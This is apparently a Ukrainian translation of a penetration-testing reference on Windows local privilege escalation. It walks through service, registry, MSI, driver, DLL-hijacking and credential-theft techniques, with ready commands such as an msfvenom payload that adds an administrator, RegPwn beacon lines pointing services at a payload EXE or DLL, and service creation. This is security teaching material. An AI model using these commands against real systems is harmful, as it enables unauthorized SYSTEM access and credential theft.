...
### **Найкращий tool для пошуку векторів локальної ескалації привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
...
У Windows є різні механізми, які можуть **перешкодити вам провести enumeration системи**, запустити виконувані файли або навіть **виявити вашу активність**. Перед початком enumeration для пошуку шляхів ескалації привілеїв слід **прочитати** наведену нижче **сторінку** та **перерахувати** всі ці **захисні** **механізми**:
...
Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів, якщо обійти перевірки безпечного шляху AppInfo. Ознайомтеся з окремим workflow обходу UIAccess/Admin Protection тут:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів accessibility реєстру Secure Desktop можна використати для довільного запису до реєстру від імені SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У новіших збірках Windows також з'явився шлях **SMB arbitrary-port** LPE, у якому привілейована локальна NTLM authentication відображається через повторно використане SMB TCP-з'єднання:
...
Перевірте, чи має версія Windows відомі вразливості (також перевірте застосовані patches).
```bash
systeminfo
...
Чи збережено в змінних середовища облікові дані або іншу цінну інформацію?
```bash
set
dir env:
...
Щоб увімкнути цю функцію, дотримуйтеся інструкцій із розділу "Transcript files" у документації, вибравши **"Module Logging"** замість **"Powershell Transcription"**.
```bash
...
Повний запис активності та всього вмісту під час виконання скрипту зберігається, забезпечуючи документування кожного блоку коду в процесі його виконання. Цей процес зберігає комплексний аудиторський журнал кожної дії, цінний для криміналістичного аналізу та дослідження шкідливої поведінки. Документування всіх дій під час виконання забезпечує детальне розуміння процесу.
```bash
...
```
Якщо ви отримуєте одну з таких відповідей:
```bash
...
Для експлуатації цих вразливостей можна використовувати такі tools: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це weaponized MiTM exploit scripts для ін’єкції «фейкових» updates у WSUS traffic без SSL.

Ознайомтеся з research тут:
...
> Якщо ми маємо можливість змінювати proxy нашого локального user, а Windows Updates використовує proxy, налаштований у settings Internet Explorer, то ми маємо можливість локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), щоб перехопити власний traffic і виконати code від імені elevated user на нашому asset.
>
> Крім того, оскільки WSUS service використовує settings поточного user, він також використовуватиме його certificate store. Якщо ми згенеруємо self-signed certificate для hostname WSUS і додамо цей certificate до certificate store поточного user, ми зможемо перехоплювати як HTTP-, так і HTTPS-трафік WSUS. WSUS не використовує механізмів на кшталт HSTS для реалізації валідації типу trust-on-first-use для certificate. Якщо certificate, який було надано, є trusted user і має правильний hostname, service прийме його.

Цю vulnerability можна експлуатувати за допомогою tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (щойно його буде liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Багато enterprise agents відкривають localhost IPC surface і privileged update channel. Якщо enrollment можна змусити підключитися до attacker server, а updater довіряє rogue root CA або використовує слабкі signer checks, локальний user може доставити malicious MSI, який SYSTEM service встановить. Узагальнену technique (на основі Netskope stAgentSvc chain — CVE-2025-0309) наведено тут:
...
Veeam B&R < `11.0.1.1261` відкриває localhost service на **TCP/9401**, який обробляє attacker-controlled messages, що дає змогу виконувати arbitrary commands від імені **NT AUTHORITY\SYSTEM**.

- **Recon**: підтвердьте наявність listener і version, наприклад, за допомогою `netstat -ano | findstr 9401` та `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: розмістіть PoC, наприклад `VeeamHax.exe`, разом із необхідними Veeam DLLs в одному directory, а потім запустіть SYSTEM payload через local socket:
```powershell
...
Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі бінарний файл Windows MSI для підвищення привілеїв. Цей скрипт створює попередньо скомпільований інсталятор MSI, який запитує додавання користувача/групи (тому вам знадобиться доступ до GIU):
```
Write-UserAddMSI
```
...
Прочитайте цей tutorial, щоб дізнатися, як створити MSI wrapper за допомогою цих tools. Зверніть увагу, що ви можете обгорнути файл "**.bat**", якщо **просто** хочете **виконувати** **command lines**
...
- Є й інші властивості, які можна змінити, наприклад **Author** і **Manufacturer**, щоб інстальований app виглядав більш легітимно.
...
[**Детальніше про захист LSA**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
...
Якщо ви **належите до певної привілейованої групи, то можете підвищити привілеї**. Дізнайтеся більше про привілейовані групи та способи їхнього використання для підвищення привілеїв тут:
...
Перегляньте цю сторінку, щоб **дізнатися про цікаві токени** та способи їхнього використання:
...
Перевірте, чи можете ви **перезаписати певний запущений binary**, або чи маєте дозволи на запис до папки binary, щоб скористатися можливими [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
...
```
Завжди перевіряйте наявність запущених [**electron/cef/chromium debuggers**], ви можете використати їх для підвищення привілеїв](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).
...
```
**Перевірка дозволів для папок бінарних файлів процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
...
Ви можете створити дамп пам’яті запущеного процесу за допомогою **procdump** із sysinternals. Такі служби, як FTP, зберігають **облікові дані у відкритому тексті в пам’яті**; спробуйте створити дамп пам’яті та прочитати облікові дані.
```bash
...
Приклад: "Windows Help and Support" (Windows + F1), виконайте пошук за запитом "command prompt" і натисніть "Click to open Command Prompt"

## Services

Service Triggers дозволяють Windows запускати service, коли виникають певні умови (активність named pipe/RPC endpoint, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START часто можна запускати privileged services, активуючи їхні triggers. Дивіться техніки enumeration та activation тут:
...
### Слабкі дозволи binary служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого доменного облікового запису, але **користувачі з низькими привілеями можуть змінювати EXE служби або її батьківську папку**, службу часто можна захопити, **замінивши binary і перезапустивши службу**.

**Перевірте, чи можете ви змінювати binary, який виконується службою**, або чи маєте ви **дозволи на запис до папки**, де розташований binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Ви можете отримати всі binary, які виконуються службою, за допомогою **wmic** (не в system32) і перевірити свої дозволи за допомогою **icacls**:
```bash
...
```
Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** або **`(W)`** для виконуваного файлу служби чи каталогу, що його містить. Практичний сценарій експлуатації:
...
```
> Якщо служба не дозволяє звичайному користувачеві перезапустити її, перевірте, чи запускається вона автоматично під час завантаження, чи має дію у разі збою, яка повторно запускає її, або чи можна опосередковано активувати її через програму, що її використовує.
...
Щоб змінити шлях до бінарного файлу, який виконується:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Деякі Windows Accessibility features створюють для кожного користувача ключі **ATConfig**, які згодом копіюються процесом **SYSTEM** до сеансового ключа HKLM. **Symbolic link race** у реєстрі може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив довільного **запису значення HKLM**.

Ключові розташування (приклад: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить список встановлених accessibility features.
...
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу в систему або переходів до secure desktop і доступний для запису користувачу.

Послідовність зловживання (CVE-2026-24291 / ATConfig):

1. Заповнити значення **HKCU ATConfig**, яке має бути записане процесом SYSTEM.
2. Запустити копіювання до secure desktop (наприклад, **LockWorkstation**), що запускає потік AT broker.
3. **Виграти race**, встановивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли oplock спрацює, замінити ключ **HKLM Session ATConfig** на **registry link**, що вказує на захищену ціль HKLM.
4. SYSTEM записує вибране атакувальником значення до перенаправленого шляху HKLM.

Отримавши довільний запис значення HKLM, перейти до LPE шляхом перезапису значень конфігурації service:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Вибрати service, який звичайний користувач може запустити (наприклад, **`msiserver`**), і запустити його після запису. **Примітка:** public exploit implementation **блокує workstation** як частину race.

Приклади tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Дозволи AppendData/AddSubdirectory у реєстрі Services

Якщо ви маєте цей дозвіл для реєстру, це означає, що **можна створювати дочірні реєстри з цього реєстру**. У випадку Windows services цього **достатньо для виконання довільного code:**
...
Якщо шлях до виконуваного файлу не взято в лапки, Windows намагатиметься виконати кожен фрагмент, що закінчується перед пробілом.
...
```
**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл service за допомогою metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Дії відновлення

Windows дозволяє користувачам указувати дії, які потрібно виконати, якщо service завершує роботу з помилкою. Цю функцію можна налаштувати так, щоб вона вказувала на binary. Якщо цей binary можна замінити, може бути можливе підвищення привілеїв. Докладнішу інформацію можна знайти в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Застосунки

### Встановлені застосунки

Перевірте **permissions бінарних файлів** (можливо, один із них можна перезаписати та підвищити привілеї) і **папок** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
...
Перевірте, чи можете ви змінити якийсь конфігураційний файл, щоб прочитати спеціальний файл, або змінити бінарний файл, який буде виконано обліковим записом Administrator (schedtasks).

Знайти слабкі дозволи для папок/файлів у системі можна за допомогою:
```bash
...
**Перевірте, чи можете ви перезаписати якийсь реєстр або бінарний файл, який буде виконуватися іншим користувачем.**\
...
Шукайте можливі **дивні/вразливі драйвери сторонніх виробників**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Якщо драйвер надає примітив довільного читання/запису в kernel (поширено в погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши SYSTEM token із kernel memory. Покрокову техніку наведено тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Для race-condition bugs, коли вразливий виклик відкриває контрольований атакувальником шлях Object Manager, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків каталогів) може збільшити вікно з мікросекунд до десятків мікросекунд:
...
#### Плутанина типів у direct-mode `RtlQueryRegistryValues` через контрольовані атакувальником шляхи

Деякі драйвери приймають шлях до registry з userland, перевіряють лише те, що це коректний рядок UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` з `RTL_QUERY_REGISTRY_DIRECT` у stack scalar, наприклад `int readValue`. Якщо відсутній `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` інтерпретується відповідно до **фактичного** типу registry, а не до типу, який очікував розробник.

Це створює два корисні примітиви:

- **Confused deputy / oracle**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу драйверу запитувати вибрані атакувальником keys, розкривати їхню наявність через коди повернення/логи, а іноді читати значення, до яких caller не мав би прямого доступу.
- **Пошкодження kernel memory**: призначення scalar, наприклад `&readValue`, через плутанину типів стає `REG_QWORD`, `UNICODE_STRING` або буфером бінарних даних визначеного розміру залежно від типу registry value.

Практичні зауваження щодо exploitation:

- **Windows 8+ mitigation**: якщо запит звертається до **untrusted hive** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers аварійно завершуються з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти exploitability, шукайте **attacker-writable keys всередині trusted system hives**, а не розміщуйте значення в `HKCU`.
- **Trusted-hive staging**: використовуйте NtObjectManager для переліку доступних для запису нащадків `\Registry\Machine`, а потім повторіть сканування з дубльованим **low-integrity** token, щоб знайти keys, доступні з sandboxed contexts:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує сусідні дані у стеку та може частково перезаписати близький callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: прямий режим очікує, що `EntryContext` вказуватиме на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований attacker'ом `REG_DWORD` у скаляр у стеку, а потім повторно використовує той самий буфер для читання рядка, attacker контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, що призводить до частково контрольованого kernel write.
- **`REG_BINARY`**: для великих бінарних даних прямий режим трактує перший `LONG` за адресою `EntryContext` як signed buffer size. Якщо попереднє читання `REG_DWORD` залишає від’ємне значення, контрольоване attacker'ом, у повторно використаному скалярі, наступний запит `REG_BINARY` копіює байти attacker безпосередньо поверх сусідніх слотів стека, що часто є найпростішим шляхом до повного перезапису callback-pointer.

Сильний hunting pattern: **різнорідні читання registry в одну й ту саму змінну у стеку без її повторної ініціалізації**. Виконуйте grep для `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використаних вказівників `EntryContext` і шляхів виконання, де перше читання registry визначає, чи відбудеться друге читання.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN в об’єктах пристроїв (LPE + EDR kill)

Деякі підписані драйвери сторонніх розробників створюють свій device object із сильним SDDL через IoCreateDeviceSecure, але забувають установити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривається через шлях, що містить додатковий компонент, тому будь-який непривілейований користувач може отримати handle, використовуючи namespace path на кшталт:
...
- Обмежуйте IOCTL (маски доступу, METHOD_*, валідація вхідних даних) і розгляньте brokered models замість прямого доступу до kernel privileges.

Ідеї щодо виявлення для захисників
- Відстежуйте відкриття підозрілих імен пристроїв із user-mode (наприклад, \\ .\\amsdk*) і певні послідовності IOCTL, що вказують на зловживання.
- Застосовуйте Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) і підтримуйте власні списки allow/deny.


## PATH DLL Hijacking

Якщо у вас є **права на запис у папку, присутню в PATH**, ви можете перехопити DLL, яку завантажує процес, і **ескалювати привілеї**.
...
Node розв'язує пакети, піднімаючись вгору деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може досягти кореня диска, тому застосунок, запущений із `C:\Users\Administrator\project\app.js`, може зрештою перевіряти:
...
Якщо **низькопривілейований користувач** може створити `C:\node_modules`, він може розмістити шкідливий `foo.js` (або папку пакета) і чекати, доки **процес Node/Electron із вищими привілеями** спробує розв'язати відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тому це перетворюється на **LPE**, коли цільовий процес працює від імені адміністратора, із підвищених привілеїв у запланованому завданні/обгортці service або в автоматично запущеному привілейованому desktop-застосунку.
...
- Фільтруйте за `Process Name` = виконуваний файл цілі (`node.exe`, EXE-файл застосунку Electron або wrapper process)
...
Реальні приклади відсутніх optional-модулів, які відповідають цьому шаблону, включають `bluebird` і `utf-8-validate`, але **техніка** є багаторазово застосовною частиною: знайдіть будь-який **відсутній bare import**, який привілейований процес Windows Node/Electron спробує розв’язати.
...
- Додавайте всі runtime-залежності до production-збірок і перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність шаблонів `try { require("...") } catch {}`, які непомітно ігнорують помилки.
...
Перевірте **служби, обмежені для зовнішнього доступу**
```bash
...
Якщо ви отримаєте права root, ви зможете прослуховувати будь-який порт (під час першого використання `nc.exe` для прослуховування порту з’явиться запит у GUI, чи дозволити `nc` працювати через firewall).
```bash
wsl whoami
...
```
Потім можна використовувати `runas` з опцією `/savecred`, щоб скористатися збереженими обліковими даними. У наведеному нижче прикладі віддалений бінарний файл викликається через SMB-шару.
```bash
...
**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрет користувача або системи, що суттєво впливає на ентропію.

**DPAPI забезпечує шифрування ключів за допомогою симетричного ключа, похідного від секретів входу користувача**. У випадках системного шифрування використовуються секрети доменної автентифікації системи.
...
Ви можете **видобути багато **masterkeys** DPAPI з **пам'яті** за допомогою модуля `sekurlsa::dpapi` (якщо маєте root-доступ).
...
Користувачі часто застосовують застосунок Sticky Notes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`, тому його завжди варто пошукати та перевірити.

### AppCmd.exe

**Зверніть увагу: для відновлення паролів із AppCmd.exe потрібні права Administrator, а запуск необхідно виконувати з рівнем High Integrity.**\
...
```
> [!TIP]
> Схоже, що ця техніка більше не є актуальною. Я спробував створити кілька ssh keys, додати їх за допомогою `ssh-add` і увійти через ssh на машину. Розділ реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час асиметричної автентифікації ключа.

### Файли без участі користувача
```
...
Раніше була доступна функція, яка дозволяла розгортати власні локальні облікові записи адміністратора на групі комп’ютерів через Group Policy Preferences (GPP). Однак цей метод мав суттєві недоліки безпеки. По-перше, Group Policy Objects (GPOs), що зберігалися як XML-файли в SYSVOL, могли бути доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 із використанням публічно задокументованого ключа за замовчуванням, могли бути розшифровані будь-яким автентифікованим користувачем. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Для зменшення цього ризику було розроблено функцію, яка шукає локально кешовані GPP-файли, що містять непорожнє поле "cpassword". Після знаходження такого файлу функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити та усунути цю вразливість безпеки.
...
Tools для вилучення паролів із браузерів:
...
COM-класи та інтерфейси визначені в registry відповідно в **HKEY\CLASSES\ROOT\CLSID** та **HKEY\CLASSES\ROOT\Interface**. Цей registry створюється шляхом об'єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Усередині CLSID цього registry можна знайти дочірній registry **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, а також значення **ThreadingModel**, яке може бути **Apartment** (однопотоковий), **Free** (багатопотоковий), **Both** (одно- або багатопотоковий) або **Neutral** (нейтральний щодо потоків).

![Історія браузерів - COM DLL Overwriting: Усередині CLSID цього registry можна знайти дочірній registry InProcServer32, який містить значення за замовчуванням, що вказує на DLL, а також значення...](<../../images/image (729).png>)

Загалом, якщо ви можете **перезаписати будь-яку DLL**, яка буде виконана, ви зможете **підвищити привілеї**, якщо цю DLL буде виконано від імені іншого користувача.
...
### **Пошук паролів у файлах і registry**
...
[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**, який я створив для **автоматичного виконання кожного metasploit POST module, що шукає облікові дані** всередині жертви.\
...
Уявімо, що **процес, який працює як SYSTEM, відкриває новий процес** (`OpenProcess()`) **з повним доступом**. Цей самий процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але успадковує всі відкриті handles головного процесу**.\
...
[Прочитайте цей **інший допис із докладнішим поясненням того, як тестувати та використовувати інші відкриті handles процесів і потоків, успадковані з різними рівнями дозволів (не лише з повним доступом)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
...
- `ClientAttach` із параметром `pszDomainUser`, встановленим у доступний для запису наявний шлях → служба відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для запису асинхронних подій.
...
### Зловживання обробником протоколу / ShellExecute через Markdown renderers

Клікабельні Markdown-посилання, передані до `ShellExecuteExW`, можуть активувати небезпечні URI handlers (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) і виконати файли, контрольовані attacker'ом, від імені поточного користувача. Дивіться:
...
Це дає змогу одночасно підвищити привілеї та обійти UAC, використовуючи одну й ту саму вразливість. Крім того, немає потреби щось встановлювати, а бінарний файл, який використовується під час процесу, підписаний і виданий Microsoft.
...
Описану [**у цьому дописі в блозі**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) техніку разом із exploit code [**можна знайти тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Атака полягає у зловживанні функцією Windows Installer для rollback, щоб замінити легітимні файли шкідливими під час процесу видалення. Для цього attacker повинен створити **malicious MSI installer**, який використовуватиметься для захоплення папки `C:\Config.Msi`. Пізніше Windows Installer використовуватиме її для зберігання rollback-файлів під час видалення інших MSI packages, причому rollback-файли буде змінено так, щоб вони містили malicious payload.

Підсумована техніка виглядає так:

1. **Етап 1 – Підготовка до Hijack (залишити `C:\Config.Msi` порожньою)**

- Крок 1: Встановлення MSI
- Створіть `.msi`, який встановлює harmless file (наприклад, `dummy.txt`) у writable folder (`TARGETDIR`).
...
- **Опитуйте open file handle** за допомогою `GetFinalPathNameByHandle`, щоб виявити момент, коли файл стає `C:\Config.Msi\<random>.rbf`.
...
- Windows Installer не може видалити `.rbf`, і оскільки він не може видалити весь вміст, папка **`C:\Config.Msi` не видаляється**.

- Крок 5: Ручне видалення `.rbf`
- Ви (attacker) вручну видаляєте файл `.rbf`.
- Тепер **`C:\Config.Msi` порожня** і готова до hijack.

> На цьому етапі **активуйте vulnerability для довільного видалення папки на рівні SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 – Заміна Rollback Scripts на шкідливі**

- Крок 6: Повторне створення `C:\Config.Msi` зі слабкими ACLs
...
- `ERROROUT`: Змінна, яка запускає forced failure.
...
- Для навмисного завершення install у відомій точці налаштовано **custom action типу 19 (`ErrorOut`)**.
...
- Запустіть надійний **auto-elevated binary** (наприклад, `osk.exe`), який завантажує hijacked DLL.
- **Boom**: Ваш code виконується **як SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлу до SYSTEM EoP

Основна MSI rollback technique (попередня) передбачає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що робити, якщо ваша vulnerability дозволяє лише **довільне видалення файлів**?
...
Що робити, якщо ваш primitive не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої зловмисником**?
...
- Це очистить `folder1`, не порушуючи oplock.
...
- Він бачить папку, **не може визначити фактичний driver** і **аварійно завершує роботу або зупиняє boot**.
...
Коли **привілейований service** записує журнали/експорти за шляхом, отриманим із **доступної для запису config**, перенаправте цей шлях за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити привілейований запис на довільний перезапис (навіть **без** SeCreateSymbolicLinkPrivilege).

**Вимоги**
- Config, що містить цільовий шлях, доступна attacker для запису (наприклад, `%ProgramData%\...\.ini`).
...
```
3. Дочекайтеся, поки привілейований компонент запише лог (наприклад, адміністратор запускає «надсилання тестового SMS»). Тепер запис потрапляє до `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписану ціль (за допомогою hex/PE parser), щоб підтвердити пошкодження; перезавантаження змушує Windows завантажити змінений шлях до драйвера → **DoS у циклі завантаження**. Це також узагальнюється на будь-який захищений файл, який привілейована служба відкриє для запису.
...
Якщо ви вже працюєте в процесі з рівнем High Integrity, **шлях до SYSTEM** може бути простим: достатньо **створити та запустити нову службу**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Під час створення бінарного файлу service переконайтеся, що це дійсний service або що бінарний файл достатньо швидко виконує необхідні дії, оскільки через 20 с його буде завершено, якщо це не дійсний service.
...
[Більше інформації про задіяні ключі реєстру та про встановлення пакета _.msi_ тут.](#alwaysinstallelevated)
...
Якщо у вас є ці привілеї token (імовірно, ви знайдете їх у вже наявному процесі з High Integrity), ви зможете **відкрити майже будь-який процес** (крім protected processes) із привілеєм SeDebug, **скопіювати token** процесу та створити **довільний процес із цим token**.\
Зазвичай у цій техніці **вибирають будь-який процес, запущений від імені SYSTEM, з усіма привілеями token** (_так, можна знайти процеси SYSTEM без усіх привілеїв token_).\
**Приклад коду, що виконує запропоновану техніку, можна** [**знайти тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ця техніка використовується meterpreter для ескалації в `getsystem`. Техніка полягає у **створенні pipe, а потім створенні/зловживанні service для запису в цей pipe**. Після цього **server**, який створив pipe із використанням привілею **`SeImpersonate`**, зможе **імперсонувати token** клієнта pipe (service), отримавши привілеї SYSTEM.\
...
Якщо вам вдасться **перехопити dll**, яку **завантажує** **процес**, запущений від імені **SYSTEM**, ви зможете виконувати довільний код із цими дозволами. Тому Dll Hijacking також корисний для такого виду ескалації привілеїв, і, крім того, його набагато **легше виконати з процесу з high integrity**, оскільки він матиме **права запису** до папок, які використовуються для завантаження dll.\
...
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевірка неправильних налаштувань і sensitive files (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявлено.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевірка деяких можливих неправильних налаштувань і збір інформації (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевірка неправильних налаштувань**\
...
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове privesc-перерахування Windows**\
...
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує host у пошуках неправильних налаштувань (це радше інструмент збору інформації, ніж privesc) (потрібно скомпілювати) **(**[**попередньо скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох software (попередньо скомпільований exe у github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевірка неправильних налаштувань (попередньо скомпільований executable у github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих неправильних налаштувань (exe із python). Не рекомендовано. Погано працює у Win10.
...
Потрібно скомпілювати проєкт із використанням правильної версії .NET ([дивіться тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену версію .NET на host жертви, можна виконати:
```
...
- [0xdf – HTB/VulnLab JobTwo: фішинг через Word VBA macro за допомогою SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: leak у форматному рядку + stack BOF → VirtualAlloc ROP (RCE) і викрадення kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Переслідування Silver Fox: гра в кішки-мишки у Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Вразливість привілейованої файлової системи у SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
...
- [Trail of Bits - Завдання C/C++ checklist, розв'язані](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
